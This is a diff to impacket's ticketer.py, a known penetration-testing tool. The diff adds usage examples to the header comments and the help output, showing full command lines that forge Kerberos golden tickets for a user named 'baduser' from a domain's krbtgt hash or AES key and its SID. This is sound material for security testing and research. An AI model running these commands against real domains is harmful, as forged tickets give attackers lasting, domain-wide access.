@@ -14,18 +14,30 @@
 #    groups, extrasids, etc.
 #    Tickets duration is fixed to 10 years from now (although you can manually change it)
 #
-# Description:
+# References:
 #    Original presentation at BlackHat USA 2014 by @gentilkiwi and @passingthehash:
 #    (http://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)
 #    Original implemetation by Benjamin Delpy (@gentilkiwi) in mimikatz
 #    (https://github.com/gentilkiwi/mimikatz)
 #
+# Examples:
+#         ./ticketer.py -nthash <krbtgt nthash> -domain-sid <your domain SID> -domain <your domain FQDN> -save baduser
+#
+#         will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
+#         If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
+#         (depending on the key specified). No traffic is generated against the KDC.
+#
+#         ./ticketer.py -nthash <krbtgt nthash> -aesKey <krbtgt AES> -domain-sid <your domain SID> -domain <your domain FQDN>
+#                       -save -request -user <a valid domain user> -password <valid domain user's password> baduser
+#
+#         will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
+#         as template for customization. Whatever encryption algorithms used on that ticket will be honored,
+#         hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'
+#
 # ToDo:
 # [ ] Silver tickets still not implemented
 # [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
-
-
 import argparse
 import datetime
 import logging
@@ -43,7 +55,7 @@ from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
     SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
 from impacket.examples import logger
-from impacket.krb5.asn1 import AS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, AD_IF_RELEVANT, EncASRepPart
+from impacket.krb5.asn1 import AS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, EncASRepPart
 from impacket.krb5.constants import ApplicationTagNumbers, PreAuthenticationDataTypes, EncryptionTypes, \
     PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
     KERB_NON_KERB_CKSUM_SALT
@@ -655,6 +667,16 @@ if __name__ == '__main__':
 
     if len(sys.argv)==1:
         parser.print_help()
+        print "\nExamples: "
+        print "\t./ticketer.py -nthash <krbtgt nthash> -domain-sid <your domain SID> -domain <your domain FQDN> -save baduser\n"
+        print "\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4."
+        print "\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256"
+        print "\t(depending on the key specified). No traffic is generated against the KDC.\n"
+        print "\t./ticketer.py -nthash <krbtgt nthash> -aesKey <krbtgt AES> -domain-sid <your domain SID> -domain " \
+              "<your domain FQDN> -save -request -user <a valid domain user> -password <valid domain user's password> baduser\n"
+        print "\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used"
+        print "\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,"
+        print "\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'\n"
         sys.exit(1)
 
     options = parser.parse_args()
